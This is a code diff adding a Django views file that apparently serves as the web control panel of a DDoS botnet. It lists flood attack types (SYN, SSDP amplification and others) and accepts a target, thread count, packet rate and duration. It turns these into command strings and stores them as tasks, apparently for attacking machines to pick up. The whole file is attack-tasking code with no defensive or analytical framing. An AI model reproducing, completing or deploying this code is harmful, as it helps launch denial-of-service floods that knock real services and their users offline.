@@ -1,0 +1,52 @@
+#-*- coding:utf-8 -*-
+from django.shortcuts import render
+from django.http import HttpResponse
+from django.http import HttpResponseRedirect
+from coreapp.models import Tasklist
+from coreapp.functions import findall,finddata,savedata,updatedata,deldata
+from coreapp.functions import encodedata
+import hashlib
+import random
+import string
+# Create your views here.
+def tasklist(request):
+    res = findall(Tasklist)
+    return render(request,'coreapp/tasklist.html',{'tasklists':res})
+    #return render(request,'coreapp/tasklist.html')
+def showConfig(request,category):
+    res = ""
+    number = int(category)
+    leader = {"1":"domainate","2":"ssyn","3":"xsyn","4":"ssdp_amp","5":"syn"}
+    try:
+       res = leader[str(number)]
+       return render(request,'coreapp/setconf.html')
+    except:
+       res = "nothing"
+       return HttpResponse(res)
+def setConfig(request):
+    if request.method == 'POST':
+       category = request.POST['category']
+       target = request.POST['target']
+       threads = request.POST['threads']
+       timer = request.POST['timer']
+       if category == "domainate":
+            pps = request.POST['pps']
+            target_hash = hashlib.md5(target).hexdigest()
+            key = target_hash[1:6] + ''.join(random.choice(string.lowercase) for i in range(3))
+            cmds = key + "$:::$" + category + "$:::$" + target + "$:::$" + str(threads) +"$:::$" + str(pps) + "$:::$" + str(timer)
+            #res = encodedata(cmd)
+       elif category =="ssyn":
+            return HttpResponse("ssyn")
+       else:
+            return HttpResponse("404")
+       data = {"target":target}
+       res = finddata(Tasklist,data)
+       if res == None:
+            data2 = {"category":category,"parameters":cmds,"target":target}
+            res2 = savedata(Tasklist,data2)
+            if res2 == 1:
+                 return HttpResponseRedirect('/tasklist')
+            else:
+                 return HttpResponse('<html><script type="text/javascript">alert("The target info store failure!"); window.location="/tasklist"</script></html>')
+       else:
+            return HttpResponse('<html><script type="text/javascript">alert("The target has existed!"); window.location="/tasklist"</script></html>')
